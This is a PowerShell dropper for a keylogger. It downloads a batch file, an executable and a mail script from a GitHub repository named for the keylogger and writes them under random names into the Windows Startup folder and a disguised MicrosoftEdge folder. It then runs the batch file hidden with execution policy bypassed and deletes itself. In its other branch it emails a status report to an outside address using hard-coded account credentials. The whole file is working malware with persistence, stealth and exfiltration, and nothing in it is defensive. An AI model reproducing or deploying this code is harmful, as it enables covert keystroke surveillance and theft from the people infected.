if (Test-Path C:\path\to\file.txt) {
    Invoke-WebRequest -URI "https://raw.githubusercontent.com/MirozoPL/mirozokeylogger/main/autostarting.bat" -OutFile "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\oPNUennj8FXKrOBhUURQ.bat"
    Invoke-WebRequest -URI "https://raw.githubusercontent.com/MirozoPL/mirozokeylogger/main/kk.exe" -OutFile "$env:LOCALAPPDATA\MicrosoftEdge\404eb8b50ea0d5d6\ygoLa8SyqmQTGsoh.exe"
    Invoke-WebRequest -URI "https://raw.githubusercontent.com/MirozoPL/mirozokeylogger/main/psmail.ps1" -OutFile "$env:LOCALAPPDATA\MicrosoftEdge\404eb8b50ea0d5d6\LhFDtKhHgdiXDSt3.ps1"
    #powershell -executionpolicy bypass -File "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\oPNUennj8FXKrOBhUURQ.bat"
    powershell -windowstyle hidden -ExecutionPolicy Bypass Start-Process "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\oPNUennj8FXKrOBhUURQ.bat"
    Remove-Item -Path $MyInvocation.MyCommand.Source
} else {
    $Username = "jankowalski69zs@outlook.com"
    $Password = ConvertTo-SecureString "JanKowalski1" -AsPlainText -Force
    $Credential = New-Object System.Management.Automation.PSCredential($Username,$Password)
    $From = "jankowalski69zs@outlook.com"
    $To = "resultsiliketowatch@op.pl"
    $Subject = "No file detected."
    $Body = "Failed attempt 0x001"
    Send-MailMessage -SmtpServer "smtp-mail.outlook.com" -UseSsl -Port 587 -Credential $Credential -From $From -To $To -Subject $Subject -Body $Body
    Remove-Item -Path $MyInvocation.MyCommand.Source
}
